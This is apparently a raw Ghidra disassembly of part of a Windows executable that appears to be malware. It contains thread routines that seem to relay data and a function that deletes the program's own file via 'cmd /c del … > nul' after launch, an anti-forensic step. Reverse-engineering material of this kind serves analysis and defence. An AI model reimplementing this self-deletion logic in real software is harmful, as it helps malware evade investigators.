
                             **************************************************************
                             * lpStartAddress parameter of CreateThread                   *
                             *                                                            *
                             **************************************************************
                             lpStartAddress_00401940                         XREF[1]:     _StartAddress_004016f0:00401718(
        00401940 81 ec 14 04     LPTHREAD   DAT_0414ec81
        00401944 00              ??         00h
        00401945 00              ??         00h
        00401946 55              ??         55h    U
        00401947 56              ??         56h    V
        00401948 57              ??         57h    W
        00401949 6a              ??         6Ah    j
        0040194a 18              ??         18h
        0040194b e8              ??         E8h
        0040194c 84              ??         84h
        0040194d 03              ??         03h
        0040194e 00              ??         00h
        0040194f 00              ??         00h
        00401950 8b              ??         8Bh
        00401951 b4              ??         B4h
        00401952 24              ??         24h    $
        00401953 28              ??         28h    (
        00401954 04              ??         04h
        00401955 00              ??         00h
        00401956 00              ??         00h
        00401957 8b              ??         8Bh
        00401958 e8              ??         E8h
        00401959 83              ??         83h
        0040195a c4              ??         C4h
        0040195b 04              ??         04h
        0040195c b9              ??         B9h
        0040195d 06              ??         06h
        0040195e 00              ??         00h
        0040195f 00              ??         00h
        00401960 00              ??         00h
        00401961 8b              ??         8Bh
        00401962 fd              ??         FDh
        00401963 8d              ??         8Dh
        00401964 44              ??         44h    D
        00401965 24              ??         24h    $
        00401966 0c              ??         0Ch
        00401967 f3              ??         F3h
        00401968 a5              ??         A5h
        00401969 8b              ??         8Bh
        0040196a 55              ??         55h    U
        0040196b 00              ??         00h
        0040196c 8b              ??         8Bh
        0040196d 3d              ??         3Dh    =
        0040196e 40              ??         40h    @                                         ?  ->  00402040
        0040196f 20              ??         20h
        00401970 40              ??         40h    @
        00401971 00              ??         00h
        00401972 6a              ??         6Ah    j
        00401973 00              ??         00h
        00401974 6a              ??         6Ah    j
        00401975 00              ??         00h
        00401976 50              ??         50h    P
        00401977 8d              ??         8Dh
        00401978 4c              ??         4Ch    L
        00401979 24              ??         24h    $
        0040197a 2c              ??         2Ch    ,
        0040197b 68              ??         68h    h
        0040197c 00              ??         00h
        0040197d 04              ??         04h
        0040197e 00              ??         00h
        0040197f 00              ??         00h
        00401980 51              ??         51h    Q
        00401981 52              ??         52h    R
        00401982 ff              ??         FFh
        00401983 d7              ??         D7h
        00401984 85              ??         85h
        00401985 c0              ??         C0h
        00401986 0f              ??         0Fh
        00401987 84              ??         84h
        00401988 c8              ??         C8h
        00401989 00              ??         00h
        0040198a 00              ??         00h
        0040198b 00              ??         00h
        0040198c 8b              ??         8Bh
        0040198d 35              ??         35h    5
        0040198e 3c              ??         3Ch    <                                         ?  ->  0040203c
        0040198f 20              ??         20h
        00401990 40              ??         40h    @
        00401991 00              ??         00h
        00401992 8b              ??         8Bh
        00401993 44              ??         44h    D
        00401994 24              ??         24h    $
        00401995 0c              ??         0Ch
        00401996 85              ??         85h
        00401997 c0              ??         C0h
        00401998 0f              ??         0Fh
        00401999 86              ??         86h
        0040199a 8d              ??         8Dh
        0040199b 00              ??         00h
        0040199c 00              ??         00h
        0040199d 00              ??         00h
        0040199e 8b              ??         8Bh
        0040199f 55              ??         55h    U
        004019a0 00              ??         00h
        004019a1 8d              ??         8Dh
        004019a2 44              ??         44h    D
        004019a3 24              ??         24h    $
        004019a4 0c              ??         0Ch
        004019a5 6a              ??         6Ah    j
        004019a6 00              ??         00h
        004019a7 50              ??         50h    P
        004019a8 8d              ??         8Dh
        004019a9 4c              ??         4Ch    L
        004019aa 24              ??         24h    $
        004019ab 28              ??         28h    (
        004019ac 68              ??         68h    h
        004019ad 00              ??         00h
        004019ae 04              ??         04h
        004019af 00              ??         00h
        004019b0 00              ??         00h
        004019b1 51              ??         51h    Q
        004019b2 52              ??         52h    R
        004019b3 ff              ??         FFh
        004019b4 d6              ??         D6h
        004019b5 8b              ??         8Bh
        004019b6 44              ??         44h    D
        004019b7 24              ??         24h    $
        004019b8 0c              ??         0Ch
        004019b9 68              ??         68h    h
        004019ba 14              ??         14h                                              ?  ->  00403014
        004019bb 30              ??         30h    0
        004019bc 40              ??         40h    @
        004019bd 00              ??         00h
        004019be c6              ??         C6h
        004019bf 44              ??         44h    D
        004019c0 04              ??         04h
        004019c1 24              ??         24h    $
        004019c2 00              ??         00h
        004019c3 40              ??         40h    @
        004019c4 89              ??         89h
        004019c5 44              ??         44h    D
        004019c6 24              ??         24h    $
        004019c7 10              ??         10h
        004019c8 8d              ??         8Dh
        004019c9 44              ??         44h    D
        004019ca 24              ??         24h    $
        004019cb 18              ??         18h
        004019cc 50              ??         50h    P
        004019cd e8              ??         E8h
        004019ce ee              ??         EEh
        004019cf f6              ??         F6h
        004019d0 ff              ??         FFh
        004019d1 ff              ??         FFh
        004019d2 8b              ??         8Bh
        004019d3 4c              ??         4Ch    L
        004019d4 24              ??         24h    $
        004019d5 14              ??         14h
        004019d6 8d              ??         8Dh
        004019d7 54              ??         54h    T
        004019d8 24              ??         24h    $
        004019d9 28              ??         28h    (
        004019da 51              ??         51h    Q
        004019db 8d              ??         8Dh
        004019dc 44              ??         44h    D
        004019dd 24              ??         24h    $
        004019de 20              ??         20h
        004019df 52              ??         52h    R
        004019e0 50              ??         50h    P
        004019e1 e8              ??         E8h
        004019e2 fa              ??         FAh
        004019e3 f7              ??         F7h
        004019e4 ff              ??         FFh
        004019e5 ff              ??         FFh
        004019e6 8b              ??         8Bh
        004019e7 54              ??         54h    T
        004019e8 24              ??         24h    $
        004019e9 20              ??         20h
        004019ea 83              ??         83h
        004019eb c4              ??         C4h
        004019ec 14              ??         14h
        004019ed 8d              ??         8Dh
        004019ee 4c              ??         4Ch    L
        004019ef 24              ??         24h    $
        004019f0 10              ??         10h
        004019f1 6a              ??         6Ah    j
        004019f2 00              ??         00h
        004019f3 6a              ??         6Ah    j
        004019f4 04              ??         04h
        004019f5 6a              ??         6Ah    j
        004019f6 0a              ??         0Ah
        004019f7 51              ??         51h    Q
        004019f8 52              ??         52h    R
        004019f9 e8              ??         E8h
        004019fa a2              ??         A2h
        004019fb 04              ??         04h
        004019fc 00              ??         00h
        004019fd 00              ??         00h
        004019fe 83              ??         83h
        004019ff c4              ??         C4h
        00401a00 0c              ??         0Ch
        00401a01 50              ??         50h    P
        00401a02 8b              ??         8Bh
        00401a03 45              ??         45h    E
        00401a04 0c              ??         0Ch
        00401a05 50              ??         50h    P
        00401a06 e8              ??         E8h
        00401a07 61              ??         61h    a
        00401a08 04              ??         04h
        00401a09 00              ??         00h
        00401a0a 00              ??         00h
        00401a0b 85              ??         85h
        00401a0c c0              ??         C0h
        00401a0d 7e              ??         7Eh    ~
        00401a0e 45              ??         45h    E
        00401a0f 8b              ??         8Bh
        00401a10 4c              ??         4Ch    L
        00401a11 24              ??         24h    $
        00401a12 0c              ??         0Ch
        00401a13 8b              ??         8Bh
        00401a14 45              ??         45h    E
        00401a15 0c              ??         0Ch
        00401a16 8d              ??         8Dh
        00401a17 54              ??         54h    T
        00401a18 24              ??         24h    $
        00401a19 20              ??         20h
        00401a1a 51              ??         51h    Q
        00401a1b 52              ??         52h    R
        00401a1c 50              ??         50h    P
        00401a1d e8              ??         E8h
        00401a1e 4e              ??         4Eh    N
        00401a1f f8              ??         F8h
        00401a20 ff              ??         FFh
        00401a21 ff              ??         FFh
        00401a22 83              ??         83h
        00401a23 c4              ??         C4h
        00401a24 0c              ??         0Ch
        00401a25 85              ??         85h
        00401a26 c0              ??         C0h
        00401a27 7e              ??         7Eh    ~
        00401a28 2b              ??         2Bh    +
        00401a29 eb              ??         EBh
        00401a2a 08              ??         08h
        00401a2b 6a              ??         6Ah    j
        00401a2c 32              ??         32h    2
        00401a2d ff              ??         FFh
        00401a2e 15              ??         15h
        00401a2f 10              ??         10h                                              ?  ->  00402010
        00401a30 20              ??         20h
        00401a31 40              ??         40h    @
        00401a32 00              ??         00h
        00401a33 8b              ??         8Bh
        00401a34 45              ??         45h    E
        00401a35 00              ??         00h
        00401a36 6a              ??         6Ah    j
        00401a37 00              ??         00h
        00401a38 8d              ??         8Dh
        00401a39 4c              ??         4Ch    L
        00401a3a 24              ??         24h    $
        00401a3b 10              ??         10h
        00401a3c 6a              ??         6Ah    j
        00401a3d 00              ??         00h
        00401a3e 51              ??         51h    Q
        00401a3f 8d              ??         8Dh
        00401a40 54              ??         54h    T
        00401a41 24              ??         24h    $
        00401a42 2c              ??         2Ch    ,
        00401a43 68              ??         68h    h
        00401a44 00              ??         00h
        00401a45 04              ??         04h
        00401a46 00              ??         00h
        00401a47 00              ??         00h
        00401a48 52              ??         52h    R
        00401a49 50              ??         50h    P
        00401a4a ff              ??         FFh
        00401a4b d7              ??         D7h
        00401a4c 85              ??         85h
        00401a4d c0              ??         C0h
        00401a4e 0f              ??         0Fh
        00401a4f 85              ??         85h
        00401a50 3e              ??         3Eh    >
        00401a51 ff              ??         FFh
        00401a52 ff              ??         FFh
        00401a53 ff              ??         FFh
        00401a54 55              ??         55h    U
        00401a55 e8              ??         E8h
        00401a56 74              ??         74h    t
        00401a57 02              ??         02h
        00401a58 00              ??         00h
        00401a59 00              ??         00h
        00401a5a 83              ??         83h
        00401a5b c4              ??         C4h
        00401a5c 04              ??         04h
        00401a5d 6a              ??         6Ah    j
        00401a5e 00              ??         00h
        00401a5f ff              ??         FFh
        00401a60 15              ??         15h
        00401a61 0c              ??         0Ch                                              ?  ->  0040200c
        00401a62 20              ??         20h
        00401a63 40              ??         40h    @
        00401a64 00              ??         00h
        00401a65 5f              ??         5Fh    _
        00401a66 5e              ??         5Eh    ^
        00401a67 5d              ??         5Dh    ]
        00401a68 90              ??         90h
        00401a69 90              ??         90h
        00401a6a 90              ??         90h
        00401a6b 90              ??         90h
        00401a6c 90              ??         90h
        00401a6d 90              ??         90h
        00401a6e 90              ??         90h
        00401a6f 90              ??         90h
                             **************************************************************
                             * lpStartAddress parameter of CreateThread                   *
                             *                                                            *
                             **************************************************************
                             lpStartAddress_00401a70                         XREF[1]:     _StartAddress_004016f0:00401761(
        00401a70 81 ec 10 04     LPTHREAD   DAT_0410ec81
        00401a74 00              ??         00h
        00401a75 00              ??         00h
        00401a76 53              ??         53h    S
        00401a77 56              ??         56h    V
        00401a78 57              ??         57h    W
        00401a79 6a              ??         6Ah    j
        00401a7a 18              ??         18h
        00401a7b e8              ??         E8h
        00401a7c 54              ??         54h    T
        00401a7d 02              ??         02h
        00401a7e 00              ??         00h
        00401a7f 00              ??         00h
        00401a80 8b              ??         8Bh
        00401a81 b4              ??         B4h
        00401a82 24              ??         24h    $
        00401a83 24              ??         24h    $
        00401a84 04              ??         04h
        00401a85 00              ??         00h
        00401a86 00              ??         00h
        00401a87 8b              ??         8Bh
        00401a88 d8              ??         D8h
        00401a89 83              ??         83h
        00401a8a c4              ??         C4h
        00401a8b 04              ??         04h
        00401a8c b9              ??         B9h
        00401a8d 06              ??         06h
        00401a8e 00              ??         00h
        00401a8f 00              ??         00h
        00401a90 00              ??         00h
        00401a91 8b              ??         8Bh
        00401a92 fb              ??         FBh
        00401a93 8d              ??         8Dh
        00401a94 44              ??         44h    D
        00401a95 24              ??         24h    $
        00401a96 1c              ??         1Ch
        00401a97 f3              ??         F3h
        00401a98 a5              ??         A5h
        00401a99 8b              ??         8Bh
        00401a9a 4b              ??         4Bh    K
        00401a9b 0c              ??         0Ch
        00401a9c 6a              ??         6Ah    j
        00401a9d 00              ??         00h
        00401a9e 68              ??         68h    h
        00401a9f 00              ??         00h
        00401aa0 04              ??         04h
        00401aa1 00              ??         00h
        00401aa2 00              ??         00h
        00401aa3 50              ??         50h    P
        00401aa4 51              ??         51h    Q
        00401aa5 e8              ??         E8h
        00401aa6 c8              ??         C8h
        00401aa7 03              ??         03h
        00401aa8 00              ??         00h
        00401aa9 00              ??         00h
        00401aaa 8b              ??         8Bh
        00401aab f0              ??         F0h
        00401aac 83              ??         83h
        00401aad fe              ??         FEh
        00401aae ff              ??         FFh
        00401aaf 74              ??         74h    t
        00401ab0 70              ??         70h    p
        00401ab1 8b              ??         8Bh
        00401ab2 3d              ??         3Dh    =
        00401ab3 48              ??         48h    H                                         ?  ->  00402048
        00401ab4 20              ??         20h
        00401ab5 40              ??         40h    @
        00401ab6 00              ??         00h
        00401ab7 8d              ??         8Dh
        00401ab8 54              ??         54h    T
        00401ab9 24              ??         24h    $
        00401aba 10              ??         10h
        00401abb 68              ??         68h    h
        00401abc 14              ??         14h                                              ?  ->  00403014
        00401abd 30              ??         30h    0
        00401abe 40              ??         40h    @
        00401abf 00              ??         00h
        00401ac0 52              ??         52h    R
        00401ac1 e8              ??         E8h
        00401ac2 fa              ??         FAh
        00401ac3 f5              ??         F5h
        00401ac4 ff              ??         FFh
        00401ac5 ff              ??         FFh
        00401ac6 8d              ??         8Dh
        00401ac7 44              ??         44h    D
        00401ac8 24              ??         24h    $
        00401ac9 24              ??         24h    $
        00401aca 56              ??         56h    V
        00401acb 8d              ??         8Dh
        00401acc 4c              ??         4Ch    L
        00401acd 24              ??         24h    $
        00401ace 1c              ??         1Ch
        00401acf 50              ??         50h    P
        00401ad0 51              ??         51h    Q
        00401ad1 e8              ??         E8h
        00401ad2 4a              ??         4Ah    J
        00401ad3 f7              ??         F7h
        00401ad4 ff              ??         FFh
        00401ad5 ff              ??         FFh
        00401ad6 6a              ??         6Ah    j
        00401ad7 06              ??         06h
        00401ad8 8d              ??         8Dh
        00401ad9 54              ??         54h    T
        00401ada 24              ??         24h    $
        00401adb 34              ??         34h    4
        00401adc 68              ??         68h    h
        00401add 70              ??         70h    p                                         ?  ->  00403070
        00401ade 30              ??         30h    0
        00401adf 40              ??         40h    @
        00401ae0 00              ??         00h
        00401ae1 52              ??         52h    R
        00401ae2 e8              ??         E8h
        00401ae3 cf              ??         CFh
        00401ae4 01              ??         01h
        00401ae5 00              ??         00h
        00401ae6 00              ??         00h
        00401ae7 83              ??         83h
        00401ae8 c4              ??         C4h
        00401ae9 20              ??         20h
        00401aea 85              ??         85h
        00401aeb c0              ??         C0h
        00401aec 74              ??         74h    t
        00401aed 44              ??         44h    D
        00401aee 8b              ??         8Bh
        00401aef 53              ??         53h    S
        00401af0 04              ??         04h
        00401af1 8d              ??         8Dh
        00401af2 44              ??         44h    D
        00401af3 24              ??         24h    $
        00401af4 0c              ??         0Ch
        00401af5 6a              ??         6Ah    j
        00401af6 00              ??         00h
        00401af7 50              ??         50h    P
        00401af8 8d              ??         8Dh
        00401af9 4c              ??         4Ch    L
        00401afa 24              ??         24h    $
        00401afb 24              ??         24h    $
        00401afc 56              ??         56h    V
        00401afd 51              ??         51h    Q
        00401afe 52              ??         52h    R
        00401aff ff              ??         FFh
        00401b00 d7              ??         D7h
        00401b01 85              ??         85h
        00401b02 c0              ??         C0h
        00401b03 74              ??         74h    t
        00401b04 1c              ??         1Ch
        00401b05 8b              ??         8Bh
        00401b06 4b              ??         4Bh    K
        00401b07 0c              ??         0Ch
        00401b08 6a              ??         6Ah    j
        00401b09 00              ??         00h
        00401b0a 8d              ??         8Dh
        00401b0b 44              ??         44h    D
        00401b0c 24              ??         24h    $
        00401b0d 20              ??         20h
        00401b0e 68              ??         68h    h
        00401b0f 00              ??         00h
        00401b10 04              ??         04h
        00401b11 00              ??         00h
        00401b12 00              ??         00h
        00401b13 50              ??         50h    P
        00401b14 51              ??         51h    Q
        00401b15 e8              ??         E8h
        00401b16 58              ??         58h    X
        00401b17 03              ??         03h
        00401b18 00              ??         00h
        00401b19 00              ??         00h
        00401b1a 8b              ??         8Bh
        00401b1b f0              ??         F0h
        00401b1c 83              ??         83h
        00401b1d fe              ??         FEh
        00401b1e ff              ??         FFh
        00401b1f 75              ??         75h    u
        00401b20 96              ??         96h
        00401b21 53              ??         53h    S
        00401b22 e8              ??         E8h
        00401b23 a7              ??         A7h
        00401b24 01              ??         01h
        00401b25 00              ??         00h
        00401b26 00              ??         00h
        00401b27 83              ??         83h
        00401b28 c4              ??         C4h
        00401b29 04              ??         04h
        00401b2a 6a              ??         6Ah    j
        00401b2b 00              ??         00h
        00401b2c ff              ??         FFh
        00401b2d 15              ??         15h
        00401b2e 0c              ??         0Ch                                              ?  ->  0040200c
        00401b2f 20              ??         20h
        00401b30 40              ??         40h    @
        00401b31 00              ??         00h
        00401b32 8b              ??         8Bh
        00401b33 15              ??         15h
        00401b34 d4              ??         D4h                                              ?  ->  004030d4
        00401b35 30              ??         30h    0
        00401b36 40              ??         40h    @
        00401b37 00              ??         00h
        00401b38 52              ??         52h    R
        00401b39 ff              ??         FFh
        00401b3a 15              ??         15h
        00401b3b 44              ??         44h    D                                         ?  ->  00402044
        00401b3c 20              ??         20h
        00401b3d 40              ??         40h    @
        00401b3e 00              ??         00h
        00401b3f 53              ??         53h    S
        00401b40 e8              ??         E8h
        00401b41 89              ??         89h
        00401b42 01              ??         01h
        00401b43 00              ??         00h
        00401b44 00              ??         00h
        00401b45 83              ??         83h
        00401b46 c4              ??         C4h
        00401b47 04              ??         04h
        00401b48 6a              ??         6Ah    j
        00401b49 00              ??         00h
        00401b4a ff              ??         FFh
        00401b4b 15              ??         15h
        00401b4c 0c              ??         0Ch                                              ?  ->  0040200c
        00401b4d 20              ??         20h
        00401b4e 40              ??         40h    @
        00401b4f 00              ??         00h
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined4 __stdcall FUN_00401b50(void)
                               assume FS_OFFSET = 0xffdff000
             undefined4        EAX:4          <RETURN>
             undefined1        Stack[-0x30c   local_30c                               XREF[1]:     00401b56(*)
                             FUN_00401b50                                    XREF[3]:     FUN_00401320:00401421(c),
                                                                                          FUN_00401320:004015d0(c),
                                                                                          _StartAddress_004016f0:00401848(
        00401b50 81 ec 48        SUB        ESP,0x348
                 03 00 00
        00401b56 8d 44 24 3c     LEA        EAX=>local_30c,[ESP + 0x3c]
        00401b5a 53              PUSH       EBX
        00401b5b 55              PUSH       EBP
        00401b5c 56              PUSH       ESI
        00401b5d 57              PUSH       EDI
        00401b5e 68 04 01        PUSH       0x104                                            DWORD nSize for GetModuleFileNameA
                 00 00
        00401b63 33 ff           XOR        EDI,EDI
        00401b65 50              PUSH       EAX                                              LPSTR lpFilename for GetModuleFi
        00401b66 57              PUSH       EDI                                              HMODULE hModule for GetModuleFil
        00401b67 ff 15 6c        CALL       dword ptr [->KERNEL32.DLL::GetModuleFileNameA]   = 000024ba
                 20 40 00
        00401b6d 85 c0           TEST       EAX,EAX
        00401b6f 0f 84 2b        JZ         LAB_00401ca0
                 01 00 00
        00401b75 8d 4c 24 4c     LEA        ECX,[ESP + 0x4c]
        00401b79 68 04 01        PUSH       0x104                                            DWORD cchBuffer for GetShortPath
                 00 00
        00401b7e 8d 54 24 50     LEA        EDX,[ESP + 0x50]
        00401b82 51              PUSH       ECX                                              LPSTR lpszShortPath for GetShort
        00401b83 52              PUSH       EDX                                              LPCSTR lpszLongPath for GetShort
        00401b84 ff 15 68        CALL       dword ptr [->KERNEL32.DLL::GetShortPathNameA]    = 000024a6
                 20 40 00
        00401b8a 85 c0           TEST       EAX,EAX
        00401b8c 0f 84 0e        JZ         LAB_00401ca0
                 01 00 00
        00401b92 8d 84 24        LEA        EAX,[ESP + 0x254]
                 54 02 00 00
        00401b99 68 04 01        PUSH       0x104                                            DWORD nSize for GetEnvironmentVa
                 00 00
        00401b9e 50              PUSH       EAX                                              LPSTR lpBuffer for GetEnvironmen
        00401b9f 68 90 30        PUSH       s_COMSPEC_00403090                               LPCSTR lpName for GetEnvironment
                 40 00
        00401ba4 ff 15 64        CALL       dword ptr [->KERNEL32.DLL::GetEnvironmentVaria   = 0000248c
                 20 40 00
        00401baa 85 c0           TEST       EAX,EAX
        00401bac 0f 84 ee        JZ         LAB_00401ca0
                 00 00 00
        00401bb2 8d 8c 24        LEA        ECX,[ESP + 0x150]
                 50 01 00 00
        00401bb9 68 88 30        PUSH       s_/c_del_00403088                                LPCSTR lpString2 for lstrcpyA
                 40 00
        00401bbe 51              PUSH       ECX                                              LPSTR lpString1 for lstrcpyA
        00401bbf ff 15 60        CALL       dword ptr [->KERNEL32.DLL::lstrcpyA]             = 00002480
                 20 40 00
        00401bc5 8b 35 5c        MOV        ESI,dword ptr [->KERNEL32.DLL::lstrcatA]         = 00002474
                 20 40 00
        00401bcb 8d 54 24 4c     LEA        EDX,[ESP + 0x4c]
        00401bcf 8d 84 24        LEA        EAX,[ESP + 0x150]
                 50 01 00 00
        00401bd6 52              PUSH       EDX                                              LPCSTR lpString2 for lstrcatA
        00401bd7 50              PUSH       EAX                                              LPSTR lpString1 for lstrcatA
        00401bd8 ff d6           CALL       ESI=>KERNEL32.DLL::lstrcatA
        00401bda 8d 8c 24        LEA        ECX,[ESP + 0x150]
                 50 01 00 00
        00401be1 68 80 30        PUSH       s_>_nul_00403080                                 LPCSTR lpString2 for lstrcatA
                 40 00
        00401be6 51              PUSH       ECX                                              LPSTR lpString1 for lstrcatA
        00401be7 ff d6           CALL       ESI=>KERNEL32.DLL::lstrcatA
        00401be9 89 7c 24 18     MOV        dword ptr [ESP + 0x18],EDI
        00401bed 8d 94 24        LEA        EDX,[ESP + 0x254]
                 54 02 00 00
        00401bf4 8d 84 24        LEA        EAX,[ESP + 0x150]
                 50 01 00 00
        00401bfb 89 7c 24 28     MOV        dword ptr [ESP + 0x28],EDI
        00401bff 89 7c 24 2c     MOV        dword ptr [ESP + 0x2c],EDI
        00401c03 8b 3d 38        MOV        EDI,dword ptr [->KERNEL32.DLL::GetCurrentProce   = 000023d6
                 20 40 00
        00401c09 68 00 01        PUSH       0x100                                            DWORD dwPriorityClass for SetPri
                 00 00
        00401c0e c7 44 24        MOV        dword ptr [ESP + 0x14],0x3c
                 14 3c 00
                 00 00
        00401c16 c7 44 24        MOV        dword ptr [ESP + 0x20],DAT_00403078              = 4Fh    O
                 20 78 30
                 40 00
        00401c1e 89 54 24 24     MOV        dword ptr [ESP + 0x24],EDX
        00401c22 89 44 24 28     MOV        dword ptr [ESP + 0x28],EAX
        00401c26 c7 44 24        MOV        dword ptr [ESP + 0x18],0x40
                 18 40 00
                 00 00
        00401c2e ff d7           CALL       EDI=>KERNEL32.DLL::GetCurrentProcess
        00401c30 8b 35 58        MOV        ESI,dword ptr [->KERNEL32.DLL::SetPriorityClass] = 00002460
                 20 40 00
        00401c36 50              PUSH       EAX                                              HANDLE hProcess for SetPriorityC
        00401c37 ff d6           CALL       ESI=>KERNEL32.DLL::SetPriorityClass
        00401c39 8b 1d 54        MOV        EBX,dword ptr [->KERNEL32.DLL::GetCurrentThread] = 0000244c
                 20 40 00
        00401c3f 6a 0f           PUSH       0xf                                              int nPriority for SetThreadPrior
        00401c41 ff d3           CALL       EBX=>KERNEL32.DLL::GetCurrentThread
        00401c43 8b 2d 50        MOV        EBP,dword ptr [->KERNEL32.DLL::SetThreadPriori   = 00002438
                 20 40 00
        00401c49 50              PUSH       EAX                                              HANDLE hThread for SetThreadPrio
        00401c4a ff d5           CALL       EBP=>KERNEL32.DLL::SetThreadPriority
        00401c4c 8d 4c 24 10     LEA        ECX,[ESP + 0x10]
        00401c50 51              PUSH       ECX                                              SHELLEXECUTEINFOA * pExecInfo fo
        00401c51 ff 15 d4        CALL       dword ptr [->SHELL32.DLL::ShellExecuteExA]       = 0000250a
                 20 40 00
        00401c57 85 c0           TEST       EAX,EAX
        00401c59 74 37           JZ         LAB_00401c92
        00401c5b 8b 54 24 48     MOV        EDX,dword ptr [ESP + 0x48]
        00401c5f 6a 40           PUSH       0x40                                             DWORD dwPriorityClass for SetPri
        00401c61 52              PUSH       EDX                                              HANDLE hProcess for SetPriorityC
        00401c62 ff d6           CALL       ESI=>KERNEL32.DLL::SetPriorityClass
        00401c64 8b 44 24 48     MOV        EAX,dword ptr [ESP + 0x48]
        00401c68 6a 01           PUSH       0x1                                              BOOL bDisablePriorityBoost for S
        00401c6a 50              PUSH       EAX                                              HANDLE hProcess for SetProcessPr
        00401c6b ff 15 4c        CALL       dword ptr [->KERNEL32.DLL::SetProcessPriorityB   = 0000241e
                 20 40 00
        00401c71 8d 4c 24 4c     LEA        ECX,[ESP + 0x4c]
        00401c75 6a 00           PUSH       0x0                                              LPCVOID dwItem2 for SHChangeNotify
        00401c77 51              PUSH       ECX                                              LPCVOID dwItem1 for SHChangeNotify
        00401c78 6a 01           PUSH       0x1                                              UINT uFlags for SHChangeNotify
        00401c7a 6a 04           PUSH       0x4                                              LONG wEventId for SHChangeNotify
        00401c7c ff 15 d8        CALL       dword ptr [->SHELL32.DLL::SHChangeNotify]        = 000024f8
                 20 40 00
        00401c82 5f              POP        EDI
        00401c83 5e              POP        ESI
        00401c84 5d              POP        EBP
        00401c85 b8 01 00        MOV        EAX,0x1
                 00 00
        00401c8a 5b              POP        EBX
        00401c8b 81 c4 48        ADD        ESP,0x348
                 03 00 00
        00401c91 c3              RET
                             LAB_00401c92                                    XREF[1]:     00401c59(j)
        00401c92 6a 20           PUSH       0x20                                             DWORD dwPriorityClass for SetPri
        00401c94 ff d7           CALL       EDI=>KERNEL32.DLL::GetCurrentProcess
        00401c96 50              PUSH       EAX                                              HANDLE hProcess for SetPriorityC
        00401c97 ff d6           CALL       ESI=>KERNEL32.DLL::SetPriorityClass
        00401c99 6a 00           PUSH       0x0                                              int nPriority for SetThreadPrior
        00401c9b ff d3           CALL       EBX=>KERNEL32.DLL::GetCurrentThread
        00401c9d 50              PUSH       EAX                                              HANDLE hThread for SetThreadPrio
        00401c9e ff d5           CALL       EBP=>KERNEL32.DLL::SetThreadPriority
                             LAB_00401ca0                                    XREF[3]:     00401b6f(j), 00401b8c(j),
                                                                                          00401bac(j)
        00401ca0 5f              POP        EDI
        00401ca1 5e              POP        ESI
        00401ca2 5d              POP        EBP
        00401ca3 33 c0           XOR        EAX,EAX
        00401ca5 5b              POP        EBX
        00401ca6 81 c4 48        ADD        ESP,0x348
                 03 00 00
        00401cac c3              RET
        00401cad 90 90 90        align      align(3)
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk uintptr_t __cdecl _beginthread(_StartAddress * _St
                               Thunked-Function: MSVCRT.DLL::_beginthread
                               assume FS_OFFSET = 0xffdff000
             uintptr_t         EAX:4          <RETURN>
             _StartAddress *   Stack[0x4]:4   _StartAddress
             uint              Stack[0x8]:4   _StackSize
             void *            Stack[0xc]:4   _ArgList
                             MSVCRT.DLL::_beginthread                        XREF[1]:     FUN_00401320:004015e7(c)
        00401cb0 ff 25 80        JMP        dword ptr [->MSVCRT.DLL::_beginthread]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk int __cdecl _strnicmp(char * _Str1, char * _Str2,
                               Thunked-Function: MSVCRT.DLL::_strnicmp
                               assume FS_OFFSET = 0xffdff000
             int               EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Str1
             char *            Stack[0x8]:4   _Str2
             size_t            Stack[0xc]:4   _MaxCount
                             MSVCRT.DLL::_strnicmp                           XREF[2]:     FUN_00401320:00401586(c),
                                                                                          FUN_00401320:0040159e(c)
        00401cb6 ff 25 84        JMP        dword ptr [->MSVCRT.DLL::_strnicmp]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk int __cdecl sprintf(char * _Dest, char * _Format,
                               Thunked-Function: MSVCRT.DLL::sprintf
                               assume FS_OFFSET = 0xffdff000
             int               EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Dest
             char *            Stack[0x8]:4   _Format
                             MSVCRT.DLL::sprintf                             XREF[2]:     FUN_00401320:00401527(c),
                                                                                          FUN_00401320:00401537(c)
        00401cbc ff 25 88        JMP        dword ptr [->MSVCRT.DLL::sprintf]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk long __cdecl atol(char * _Str)
                               Thunked-Function: MSVCRT.DLL::atol
                               assume FS_OFFSET = 0xffdff000
             long              EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Str
                             MSVCRT.DLL::atol                                XREF[1]:     FUN_00401320:0040143d(c)
        00401cc2 ff 25 8c        JMP        dword ptr [->MSVCRT.DLL::atol]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk char * __cdecl strchr(char * _Str, int _Val)
                               Thunked-Function: MSVCRT.DLL::strchr
                               assume FS_OFFSET = 0xffdff000
             char *            EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Str
             int               Stack[0x8]:4   _Val
                             MSVCRT.DLL::strchr                              XREF[1]:     FUN_00401320:00401331(c)
        00401cc8 ff 25 90        JMP        dword ptr [->MSVCRT.DLL::strchr]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk void __cdecl free(void * _Memory)
                               Thunked-Function: MSVCRT.DLL::free
                               assume FS_OFFSET = 0xffdff000
             void              <VOID>         <RETURN>
             void *            Stack[0x4]:4   _Memory
                             MSVCRT.DLL::free                                XREF[2]:     FUN_00401600:004016a4(c),
                                                                                          _StartAddress_004016f0:00401840(
        00401cce ff 25 94        JMP        dword ptr [->MSVCRT.DLL::free]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk void * __cdecl malloc(size_t _Size)
                               Thunked-Function: MSVCRT.DLL::malloc
                               assume FS_OFFSET = 0xffdff000
             void *            EAX:4          <RETURN>
             size_t            Stack[0x4]:4   _Size
                             MSVCRT.DLL::malloc                              XREF[2]:     FUN_00401600:00401618(c),
                                                                                          _StartAddress_004016f0:004016f7(
        00401cd4 ff 25 98        JMP        dword ptr [->MSVCRT.DLL::malloc]
                 20 40 00
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall entry(void)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
